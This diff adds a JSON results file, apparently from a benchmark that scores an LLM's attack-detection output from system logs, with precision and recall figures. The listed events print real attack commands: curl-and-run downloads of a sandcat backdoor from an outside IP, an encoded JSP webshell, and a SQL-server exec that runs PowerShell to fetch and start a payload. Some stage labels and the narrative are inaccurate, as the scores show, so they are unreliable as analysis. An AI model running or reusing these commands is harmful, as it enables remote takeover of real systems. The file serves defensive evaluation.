@@ -1,0 +1,75 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "sh -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWrTZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9...",
+        "stage": "Discovery"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server htt...",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252...[truncated]",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "-server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "Based on the updated analysis, an attacker attempted to gain remote access to the system by installing and running the SandCat backdoor through various means, including SQL injection attacks. They also exploited vulnerabilities in SQLTool to steal sensitive user credentials. To achieve this, they executed discovery operations to uncover useful information about the target machine, initiate lateral movement via sandboxing tools, execute common Unix/Linux commands, and set up persistence mechanisms to ensure continued control over the system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 30019,
+      "completion_tokens": 4636,
+      "total_tokens": 34655,
+      "wall_clock_s": 56.252,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6666666666666666,
+      "recall": 0.5,
+      "f1": 0.5714285714285715,
+      "tp": 4,
+      "fp": 2,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.16666666666666666,
+      "recall": 0.14285714285714285,
+      "f1": 0.15384615384615383,
+      "tp": 1,
+      "fp": 5,
+      "fn": 6,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 30019,
+      "completion_tokens": 4636,
+      "total_tokens": 34655,
+      "wall_clock_s": 56.252,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
